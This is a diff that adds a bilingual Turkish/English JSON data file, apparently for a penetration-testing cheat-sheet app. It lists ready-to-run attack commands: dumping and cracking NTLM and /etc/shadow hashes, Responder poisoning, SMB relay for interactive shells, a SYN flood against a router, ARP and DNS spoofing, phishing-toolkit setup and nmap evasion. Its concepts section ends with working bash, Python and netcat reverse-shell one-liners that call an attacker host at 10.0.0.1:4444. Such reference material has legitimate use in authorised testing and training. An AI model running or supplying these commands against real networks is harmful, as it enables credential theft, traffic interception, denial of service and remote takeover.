+        "name": "Linux /etc/shadow Hash Türleri",
+        "tr": "Linux parola özetlerinde kullanılan algoritmalar id numarasına ( $id$ ) göre anlaşılır.",
+        "en": "Algorithms used in Linux password hashes are identified by their id number ( $id$ ).",
+        "syntax": "$id$salt$hash",
+        "ex": [
+          {
+            "c": "$1$ -> MD5\n$2a$ / $2y$ -> Blowfish (Bcrypt)\n$5$ -> SHA-256\n$6$ -> SHA-512 (Modern Linux)",
+            "tr": "Linux Hash algoritması formatları ve ID numaraları.",
+            "en": "Linux Hash algorithm formats and ID numbers."
+          },
+          {
+            "c": "hashcat -m 1800 hash.txt rockyou.txt",
+            "tr": "Linux $6$ (SHA-512) formatındaki hash'i Hashcat ile kır (-m 1800).",
+            "en": "Crack Linux $6$ (SHA-512) hash with Hashcat (-m 1800)."
+          }
+        ]
+      },
+      {
+        "name": "NTLM Hash'lerini Yığınlama ve Kırma (Dumping & Cracking)",
+        "tr": "Windows hedefinden (SAM dosyasından veya LSASS'den) NTLM hashlerini çıkarıp Hashcat/John ile çevrimdışı kırma.",
+        "en": "Dumping NTLM hashes from Windows target (SAM file or LSASS) and cracking them offline with Hashcat/John.",
+        "syntax": "secretsdump.py / hashcat",
+        "ex": [
+          {
+            "c": "impacket-secretsdump yetkili_kullanici:sifre@192.168.1.10",
+            "tr": "Impacket kullanarak hedefteki SAM veritabanındaki tüm NTLM hash'lerini uzaktan çek (Dumping).",
+            "en": "Remotely dump all NTLM hashes from the SAM database on the target using Impacket."
+          },
+          {
+            "c": "hashcat -m 1000 hashes.txt rockyou.txt",
+            "tr": "Elde edilen Windows NTLM hash'lerini (Format 1000) rockyou kelime listesiyle kırmaya çalış.",
+            "en": "Attempt to crack the obtained Windows NTLM hashes (Format 1000) using the rockyou wordlist."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "cat": "adInitialAccess",
+    "cmds": [
+      {
+        "name": "LLMNR / NBT-NS Poisoning (Konsept)",
+        "tr": "LLMNR, DNS'in çözümleyemediği isimleri ağa multicast soran Windows protokolüdür. Saldırgan (Responder) sahte yanıt dönerek NTLMv2 hash'lerini yakalar.",
+        "en": "LLMNR is a Windows protocol that multicasts name queries when DNS fails. An attacker (Responder) sends fake replies to capture NTLMv2 hashes.",
+        "syntax": "Saldırı Vektörü",
+        "ex": [
+          {
+            "c": "1. Hatalı İstek (\\palsayim)\n2. DNS Başarısızlığı\n3. LLMNR Yayını (Multicast)\n4. Sahte Yanıt (Poisoning)\n5. NTLMv2 Hash Yakalama",
+            "tr": "Saldırı Adımları",
+            "en": "Attack Steps"
+          },
+          {
+            "c": "GPO üzerinden LLMNR ve NBT-NS protokollerini tamamen devre dışı bırakın.",
+            "tr": "Savunma (Defense)",
+            "en": "Defense"
+          }
+        ]
+      },
+      {
+        "name": "responder",
+        "tr": "Ağdaki LLMNR, NBT-NS ve MDNS isteklerini zehirleyerek NTLMv2 hash'lerini yakalayan araç.",
+        "en": "A tool that poisons LLMNR, NBT-NS and MDNS requests to capture NTLMv2 hashes.",
+        "syntax": "responder -I <interface> [options]",
+        "ex": [
+          {
+            "c": "sudo responder -I tun0 -dwP",
+            "tr": "Aktif zehirleme modu (DHCP, WPAD ve Proxy dahil)",
+            "en": "Active poisoning mode (includes DHCP, WPAD, Proxy)"
+          },
+          {
+            "c": "sudo responder -I eth0 -rdwv",
+            "tr": "LLMNR, NBT-NS ve MDNS zehirlemesini aktif et, detaylı çıktı (verbose)",
+            "en": "Enable LLMNR, NBT-NS and MDNS poisoning, verbose output"
+          },
+          {
+            "c": "sudo responder -I eth0 -A",
+            "tr": "Sadece pasif analiz modu (ağ gürültüsünü dinler, yanıt dönmez)",
+            "en": "Analyze mode only (passive, listens to network noise)"
+          }
+        ]
+      },
+      {
+        "name": "hashcat (NTLMv2 Kırma)",
+        "tr": "Yakalanan NTLMv2 hash'lerini GPU gücüyle kırmak için hashcat kullanımı.",
+        "en": "Using hashcat to crack captured NTLMv2 hashes with GPU power.",
+        "syntax": "hashcat -m 5600 [hash_file] [wordlist] [rules]",
+        "ex": [
+          {
+            "c": "hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt",
+            "tr": "NTLMv2 hash'ine rockyou sözlüğü ile saldırı",
+            "en": "Attack NTLMv2 hash with rockyou wordlist"
+          },
+          {
+            "c": "hashcat -m 5600 hash.txt rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule",
+            "tr": "Kurallarla kırma kapasitesini kat kat artır (rakam/sembol/büyük-küçük harf ekler)",
+            "en": "Multiply cracking capacity with rules"
+          }
+        ]
+      },
+      {
+        "name": "john (NTLMv2 Kırma)",
+        "tr": "Yakalanan NTLMv2 hash'lerini CPU kullanarak kırmak (John the Ripper).",
+        "en": "Cracking captured NTLMv2 hashes using CPU (John the Ripper).",
+        "syntax": "john --format=netntlmv2 [hash_file] --wordlist=[wordlist]",
+        "ex": [
+          {
+            "c": "john --format=netntlmv2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt",
+            "tr": "John the Ripper ile NTLMv2 hash kırma",
+            "en": "Crack NTLMv2 hash with John the Ripper"
+          }
+        ]
+      },
+      {
+        "name": "ntlmrelayx.py",
+        "tr": "Yakalanan hash'i kırmak yerine, SMB imzalama kapalı olan makinelere yansıtarak (relay) yetkisiz erişim sağlar.",
+        "en": "Relays captured hashes to machines with SMB signing disabled to gain unauthorized access instead of cracking.",
+        "syntax": "python3 ntlmrelayx.py -t <hedef_ip>",
+        "ex": [
+          {
+            "c": "python3 ntlmrelayx.py -t 192.168.1.50 -i",
+            "tr": "Hash'i hedef makineye relay yap ve interaktif SMB shell elde et",
+            "en": "Relay hash and get interactive SMB shell"
+          }
+        ]
+      },
+      {
+        "name": "netexec (nxc) / crackmapexec",
+        "tr": "Active Directory ortamlarında yanal hareket, kimlik doğrulama testleri ve bilgi toplama aracı.",
+        "en": "A swiss army knife for pentesting Active Directory environments (lateral movement, auth testing, enumeration).",
+        "syntax": "nxc [protokol] [hedef] -u [kullanıcı] -p [şifre]",
+        "ex": [
+          {
+            "c": "nxc smb 192.168.1.0/24",
+            "tr": "Ağdaki SMB sunucularını ve domain bilgilerini tara",
+            "en": "Scan for SMB servers and domain info in the network"
+          },
+          {
+            "c": "nxc smb 192.168.1.10 -u 'admin' -p 'Pass123' --local-auth",
+            "tr": "Yerel admin erişimini test et ('Pwned!' dönerse yetkilidir)",
+            "en": "Test local admin access ('Pwned!' means admin)"
+          }
+        ]
+      },
+      {
+        "name": "SMB Relay Saldırıları",
+        "tr": "Hedefin bize yolladığı (örn: Responder ile yönlendirilen) NTLM kimlik doğrulama isteğini kırıp çözmek yerine, başka bir makineye aynen yansıtarak (Relay) yetkisiz oturum açma.",
+        "en": "Instead of cracking the NTLM auth request sent to us, reflecting (Relaying) it to another machine to gain unauthorized access.",
+        "syntax": "impacket-ntlmrelayx / smb_relay",
+        "ex": [
+          {
+            "c": "impacket-ntlmrelayx -tf targets.txt -smb2support -i",
+            "tr": "SMB İmzalama özelliği kapalı (SMB Signing Disabled) makinelerin bulunduğu listeye (targets.txt) hashleri yansıt ve interaktif shell (-i) bekle.",
+            "en": "Relay hashes to a list of machines (targets.txt) with SMB Signing Disabled and wait for interactive shell (-i)."
+          },
+          {
+            "c": "use exploit/windows/smb/smb_relay\nset SMBHOST 192.168.1.50\nexploit",
+            "tr": "Metasploit modülü kullanarak gelen SMB bağlantısını anında hedef makineye (SMBHOST) yansıt.",
+            "en": "Use Metasploit module to instantly relay incoming SMB connection to target machine (SMBHOST)."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "cat": "networkAttacks",
+    "cmds": [
+      {
+        "name": "hping3 (Modem/Ağ DoS)",
+        "tr": "Özel TCP/IP paketleri göndererek ağ donanımlarını (modem/router) kilitlemek veya test etmek için kullanılır.",
+        "en": "Used to send custom TCP/IP packets to lock down or test network hardware (modem/router).",
+        "syntax": "hping3 [options] [hedef]",
+        "ex": [
+          {
+            "c": "sudo hping3 -S -p 80 --flood [Modem_IP]",
+            "tr": "Hedef IP'nin 80 portuna TCP SYN Flood saldırısı yaparak arayüzü kilitle",
+            "en": "Lock interface by sending TCP SYN Flood to port 80 of target IP"
+          }
+        ]
+      },
+      {
+        "name": "arpspoof (ARP Zehirlenmesi)",
+        "tr": "Ağdaki cihazları kandırarak trafiği kendi üzerine çekme (MITM) aracı.",
+        "en": "ARP Spoofing tool to trick network devices and intercept traffic (MITM).",
+        "syntax": "arpspoof -i [arayüz] -t [hedef] [ağ_geçidi]",
+        "ex": [
+          {
+            "c": "sudo sysctl -w net.ipv4.ip_forward=1",
+            "tr": "1. IP Yönlendirmeyi Açma (Paket kaybını önlemek için)",
+            "en": "1. Enable IP Forwarding (to prevent packet loss)"
+          },
+          {
+            "c": "sudo arpspoof -i eth0 -t [Hedef_IP] [Modem_IP]",
+            "tr": "2. Modemi Kandırma (Trafiği üzerine çek)",
+            "en": "2. Trick the modem (intercept traffic)"
+          },
+          {
+            "c": "sudo arpspoof -i eth0 -t [Modem_IP] [Hedef_IP]",
+            "tr": "3. Kullanıcıyı Kandırma",
+            "en": "3. Trick the user"
+          }
+        ]
+      },
+      {
+        "name": "urlsnarf",
+        "tr": "Ağdan geçen HTTP isteklerini (URL'leri) yakalayıp loglayan çıkış izleme aracı.",
+        "en": "Tool that intercepts and logs HTTP requests (URLs) passing through the network.",
+        "syntax": "urlsnarf -i [arayüz]",
+        "ex": [
+          {
+            "c": "sudo urlsnarf -i eth0",
+            "tr": "eth0 arayüzü üzerindeki HTTP trafiğini izle (ARP Spoof sonrası)",
+            "en": "Monitor HTTP traffic on eth0 interface (after ARP Spoof)"
+          }
+        ]
+      },
+      {
+        "name": "dnsspoof",
+        "tr": "DNS İsteklerini zehirleyerek kurbanları sahte sitelere yönlendirme aracı.",
+        "en": "Tool to poison DNS requests and redirect victims to fake websites.",
+        "syntax": "dnsspoof -i [arayüz] -f [hosts_dosyası]",
+        "ex": [
+          {
+            "c": "nano yalanlar.txt\n# İçerik: [Kendi_IP] www.hedefsite.com",
+            "tr": "1. Dosya Düzenleme (Sahte kayıt oluştur)",
+            "en": "1. Edit File (Create fake record)"
+          },
+          {
+            "c": "sudo sysctl -w net.ipv4.ip_forward=1",
+            "tr": "2. IP Yönlendirmeyi Açma (Bağlantı kopmaması için)",
+            "en": "2. Enable IP Forwarding (prevent disconnect)"
+          },
+          {
+            "c": "sudo dnsspoof -i eth0 -f yalanlar.txt",
+            "tr": "3. DNS Spoofing'i Başlatma",
+            "en": "3. Start DNS Spoofing"
+          }
+        ]
+      },
+      {
+        "name": "setoolkit",
+        "tr": "Social-Engineering Toolkit (SET). Oltalama (Phishing) ve sosyal mühendislik saldırıları için framework.",
+        "en": "Social-Engineering Toolkit (SET). Framework for phishing and social engineering attacks.",
+        "syntax": "setoolkit",
+        "ex": [
+          {
+            "c": "hostname -I",
+            "tr": "1. IP Öğrenme (SET ayarları için gerekli)",
+            "en": "1. Find IP (required for SET config)"
+          },
+          {
+            "c": "sudo setoolkit",
+            "tr": "2. Aracı Başlatma (Menü arayüzü açılır)",
+            "en": "2. Start the tool (Menu interface opens)"
+          }
+        ]
+      },
+      {
+        "name": "bettercap",
+        "tr": "Ağ analiz, MITM saldırıları, WiFi/BLE testleri için geliştirilmiş modern ve kapsamlı sızma testi aracı.",
+        "en": "Modern and comprehensive pentesting tool for network analysis, MITM attacks, WiFi/BLE testing.",
+        "syntax": "bettercap -iface [arayüz]",
+        "ex": [
+          {
+            "c": "sudo bettercap -iface eth0",
+            "tr": "Bettercap interaktif modunu başlat",
+            "en": "Start Bettercap interactive mode"
+          },
+          {
+            "c": "net.probe on; net.show",
+            "tr": "Ağdaki cihazları tarayıp listele (interaktif konsol komutu)",
+            "en": "Scan and list devices on the network (interactive console command)"
+          },
+          {
+            "c": "arp.spoof on; net.sniff on",
+            "tr": "Ağda ARP Spoofing ve paket dinlemeyi (sniffing) aktif et",
+            "en": "Enable ARP Spoofing and packet sniffing"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "cat": "nmapAdvanced",
+    "cmds": [
+      {
+        "name": "nmap (Host Keşfi)",
+        "tr": "Ağdaki canlı cihazları port taraması yapmadan hızlıca tespit etme (Ping Sweep).",
+        "en": "Quickly detecting live devices on the network without port scanning (Ping Sweep).",
+        "syntax": "nmap -sn [hedef]",
+        "ex": [
+          {
+            "c": "nmap -sn 192.168.1.0/24",
+            "tr": "Tüm ağda canlı cihazları bul (Port taraması yapmaz, hızlıdır)",
+            "en": "Find live devices in entire network (No port scan, fast)"
+          }
+        ]
+      },
+      {
+        "name": "nmap (Stealth/TCP Tarama)",
+        "tr": "Portların durumunu (Açık/Kapalı/Filtreli) tespit etme yöntemleri.",
+        "en": "Methods to determine port states (Open/Closed/Filtered).",
+        "syntax": "nmap [tarama_tipi] [hedef]",
+        "ex": [
+          {
+            "c": "sudo nmap -sS 192.168.1.10",
+            "tr": "SYN Stealth Scan (Yarı açık tarama, loglara yakalanma ihtimali daha düşüktür)",
+            "en": "SYN Stealth Scan (Half-open scan, lower chance of being logged)"
+          },
+          {
+            "c": "nmap -sT 192.168.1.10",
+            "tr": "TCP Connect Scan (Tam bağlantı kurar, log bırakır ama root yetkisi gerektirmez)",
+            "en": "TCP Connect Scan (Full connection, leaves logs but doesn't require root)"
+          }
+        ]
+      },
+      {
+        "name": "nmap (UDP Tarama)",
+        "tr": "DNS, SNMP, DHCP gibi UDP protokolü kullanan portları tarama yöntemi.",
+        "en": "Method to scan ports using UDP protocol like DNS, SNMP, DHCP.",
+        "syntax": "nmap -sU [hedef]",
+        "ex": [
+          {
+            "c": "sudo nmap -sU --top-ports 20 192.168.1.10",
+            "tr": "En sık kullanılan 20 UDP portunu tara (UDP taramaları yavaştır)",
+            "en": "Scan top 20 UDP ports (UDP scans are slow)"
+          }
+        ]
+      },
+      {
+        "name": "nmap (Versiyon ve OS Tespiti)",
+        "tr": "Açık portlarda çalışan servislerin sürümlerini ve hedef makinenin işletim sistemini bulma.",
+        "en": "Finding service versions on open ports and the target's operating system.",
+        "syntax": "nmap -sV -O [hedef]",
+        "ex": [
+          {
+            "c": "nmap -sV 192.168.1.10",
+            "tr": "Çalışan servislerin banner ve versiyon bilgilerini çek",
+            "en": "Fetch banner and version info of running services"
+          },
+          {
+            "c": "sudo nmap -O 192.168.1.10",
+            "tr": "İşletim sistemini tahmin et (TCP/IP fingerprinting)",
+            "en": "Guess operating system (TCP/IP fingerprinting)"
+          }
+        ]
+      },
+      {
+        "name": "nmap (NSE Script Taraması)",
+        "tr": "Nmap Scripting Engine (NSE) kullanarak zafiyet tarama, kaba kuvvet ve bilgi toplama.",
+        "en": "Using Nmap Scripting Engine (NSE) for vulnerability scanning, brute-forcing, and enum.",
+        "syntax": "nmap --script=[script_adı] [hedef]",
+        "ex": [
+          {
+            "c": "nmap -sC 192.168.1.10",
+            "tr": "Varsayılan (default) scriptleri çalıştır",
+            "en": "Run default scripts"
+          },
+          {
+            "c": "nmap --script=vuln 192.168.1.10",
+            "tr": "Hedefteki bilinen CVE zafiyetlerini (Vulnerabilities) tara",
+            "en": "Scan for known CVE vulnerabilities on target"
+          },
+          {
+            "c": "nmap --script=smb-enum-shares -p 445 192.168.1.10",
+            "tr": "Hedefteki SMB paylaşımlarını listele",
+            "en": "List SMB shares on target"
+          }
+        ]
+      },
+      {
+        "name": "nmap (Performans ve Gizlilik)",
+        "tr": "Tarama hızını ayarlama, IDS/IPS sistemlerini atlatma (Evasion) teknikleri.",
+        "en": "Adjusting scan speed, evading IDS/IPS systems.",
+        "syntax": "nmap [hız/gizlilik_bayrakları] [hedef]",
+        "ex": [
+          {
+            "c": "nmap -p- -T4 -A 192.168.1.10",
+            "tr": "Tüm portları (-p-) Hızlı (T4) ve Agresif (OS, Versiyon, Script, Traceroute bir arada) tara",
+            "en": "Fast (T4) and Aggressive scan on all ports (-p-)"
+          },
+          {
+            "c": "nmap -D 10.0.0.1,10.0.0.2,ME 192.168.1.10",
+            "tr": "Decoy (Yem): Taramayı sanki başka IP'lerden de geliyormuş gibi göster (Gizlenme)",
+            "en": "Decoy: Make scan appear as if coming from other IPs as well (Evasion)"
+          },
+          {
+            "c": "nmap --mtu 24 192.168.1.10",
+            "tr": "Paketleri parçalayarak IDS/Güvenlik Duvarı atlatmaya çalış",
+            "en": "Fragment packets to try evading IDS/Firewall"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "cat": "concepts",
+    "cmds": [
+      {
+        "name": "IP & MAC Adresleri",
+        "tr": "IP (Mantıksal ağ adresi, örn: 192.168.1.5) ve MAC (Fiziksel donanım kimliği). MAC adresi Layer 2'de, IP adresi Layer 3'te çalışır.",
+        "en": "IP (Logical network address) and MAC (Physical hardware ID).",
+        "syntax": "Ağ Kavramı",
+        "ex": [
+          {
+            "c": "IP: 192.168.57.139 (/24 maske ile)\nMAC: 00:0c:29:0a:42:05 (OUI kısmı üreticiyi gösterir)",
+            "tr": "Örnek Adresler",
+            "en": "Example Addresses"
+          }
+        ]
+      },
+      {
+        "name": "TCP vs UDP",
+        "tr": "TCP: Güvenilir, sıralı, 3-way handshake (SYN, SYN-ACK, ACK) yapar. UDP: Hızlı, bağlantısız, en iyi çaba (Best-Effort).",
+        "en": "TCP: Reliable, ordered, 3-way handshake. UDP: Fast, connectionless.",
+        "syntax": "Ağ Kavramı",
+        "ex": [
+          {
+            "c": "TCP: HTTP, SSH, FTP\nUDP: DNS, VoIP",
+            "tr": "Yaygın Kullanım Alanları",
+            "en": "Common Use Cases"
+          }
+        ]
+      },
+      {
+        "name": "OSI Modeli",
+        "tr": "Ağ iletişimini 7 katmana böler: 1) Fiziksel, 2) Veri Bağlantı, 3) Ağ, 4) Taşıma, 5) Oturum, 6) Sunum, 7) Uygulama.",
+        "en": "OSI Model: 7 layers of networking.",
+        "syntax": "Ağ Kavramı",
+        "ex": [
+          {
+            "c": "L2: MAC (Switch)\nL3: IP (Router)\nL4: TCP/UDP (Port)",
+            "tr": "Kritik Katmanlar",
+            "en": "Critical Layers"
+          }
+        ]
+      },
+      {
+        "name": "Subnetting",
+        "tr": "IP bloklarını alt ağlara bölmek. Örn: /24 maskesi 254 kullanılabilir cihaz destekler.",
+        "en": "Dividing IP blocks into subnets. E.g., /24 mask supports 254 hosts.",
+        "syntax": "Ağ Kavramı",
+        "ex": [
+          {
+            "c": "192.168.1.0/24 -> 254 Hosts\n192.168.1.0/28 -> 14 Hosts\nFormül: (2^n - 2)",
+            "tr": "Subnet Kapasiteleri",
+            "en": "Subnet Capacities"
+          }
+        ]
+      },
+      {
+        "name": "Pentest Yaşam Döngüsü",
+        "tr": "Sızma Testi Adımları: 1) Keşif (Recon), 2) Tarama (Scan/Enum), 3) Sömürü (Exploit), 4) Kalıcılık (Maintain Access), 5) İz Silme (Cover Tracks).",
+        "en": "Penetration Testing Lifecycle.",
+        "syntax": "Siber Güvenlik Kavramı",
+        "ex": [
+          {
+            "c": "Recon -> Scan -> Exploit -> Maintain -> Cover Tracks",
+            "tr": "Döngü Sırası",
+            "en": "Lifecycle Order"
+          }
+        ]
+      },
+      {
+        "name": "Reverse & Bind Shell",
+        "tr": "Reverse Shell: Kurban saldırgana bağlanır (Firewall atlatmak için iyidir). Bind Shell: Kurban port açar, saldırgan ona bağlanır.",
+        "en": "Reverse Shell: Victim connects to attacker. Bind Shell: Victim opens port, attacker connects.",
+        "syntax": "Siber Güvenlik Kavramı",
+        "ex": [
+          {
+            "c": "# Reverse Shell\nnc -lvp 4444 (Saldırgan dinler)\nnc <ip> 4444 -e /bin/sh (Kurban bağlanır)",
+            "tr": "Reverse Shell Mantığı",
+            "en": "Reverse Shell Logic"
+          }
+        ]
+      },
+      {
+        "name": "Staged vs Non-Staged",
+        "tr": "Staged (Kademeli): Önce küçük stager gider, asıl shell'i RAM'e çeker. Non-Staged: Tümü tek pakette gider (daha stabil olabilir).",
+        "en": "Staged: Small stager fetches rest. Non-Staged: All at once.",
+        "syntax": "Siber Güvenlik Kavramı",
+        "ex": [
+          {
+            "c": "windows/shell/reverse_tcp (Staged - Kademeli)\nwindows/shell_reverse_tcp (Non-Staged - Tek Parça)",
+            "tr": "Metasploit Payload Örnekleri",
+            "en": "Metasploit Payload Examples"
+          }
+        ]
+      },
+      {
+        "name": "Payload Türü: reverse_tcp",
+        "tr": "Kurban bilgisayarın, saldırganın bekleyen dinleyicisine (Listener) internet veya yerel ağ üzerinden ters bağlantı yapmasını sağlayan yük türüdür. Güvenlik duvarlarını aşmak için en çok bu tercih edilir.",
+        "en": "Payload type that makes the victim computer connect back to the attacker's listener. Most preferred for evading firewalls.",
+        "syntax": "windows/meterpreter/reverse_tcp",
+        "ex": [
+          {
+            "c": "set PAYLOAD linux/x86/meterpreter/reverse_tcp\nset LHOST [Kendi_IP]",
+            "tr": "Kurban makinedeki payload çalışınca doğrudan bizim IP adresimize ağ bağlantısı kurar.",
+            "en": "When the payload on the victim machine runs, it establishes a network connection directly to our IP address."
+          }
+        ]
+      },
+      {
+        "name": "Payload Türü: jsp_shell_bind_tcp",
+        "tr": "Kurban makinede (genellikle Tomcat/Java) belirli bir portu dışarıya açarak dinlemeye alan (Bind Shell) ve bizim o porta bağlanmamızı bekleyen Java tabanlı payload.",
+        "en": "Java-based payload that opens a specific port on the victim machine (usually Tomcat/Java) and waits for us to connect (Bind Shell).",
+        "syntax": "java/jsp_shell_bind_tcp",
+        "ex": [
+          {
+            "c": "set PAYLOAD java/jsp_shell_bind_tcp\nset LPORT 4444",
+            "tr": "Hedef makinede 4444 portu dışarı açılır. Saldırgan netcat (nc [hedef] 4444) ile bu porta gidip shell alır.",
+            "en": "Port 4444 is opened on the target machine. Attacker uses netcat to connect and get shell."
+          }
+        ]
+      },
+      {
+        "name": "Reverse Shell Cheatsheet",
+        "tr": "Farklı dillerde (Bash, Python, Netcat) hedef makineden saldırgana ters bağlantı (Reverse Shell) alma komutları.",
+        "en": "Commands to get a reverse shell from target to attacker in various languages (Bash, Python, Netcat).",
+        "syntax": "Çeşitli dillerde payloadlar",
+        "ex": [
+          {
+            "c": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+            "tr": "Bash Reverse Shell (Saldırganın IP'si 10.0.0.1, Port 4444)",
+            "en": "Bash Reverse Shell (Attacker IP 10.0.0.1, Port 4444)"
+          },
+          {
+            "c": "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
+            "tr": "Python Reverse Shell",
+            "en": "Python Reverse Shell"
+          },
+          {
+            "c": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 >/tmp/f",
+            "tr": "Netcat (nc) mkfifo Reverse Shell (Hedefte nc'nin -e parametresi yoksa kullanılır)",
+            "en": "Netcat (nc) mkfifo Reverse Shell (Used if target's nc lacks -e flag)"
+          }
+        ]
+      }
+    ]
+  }
+]
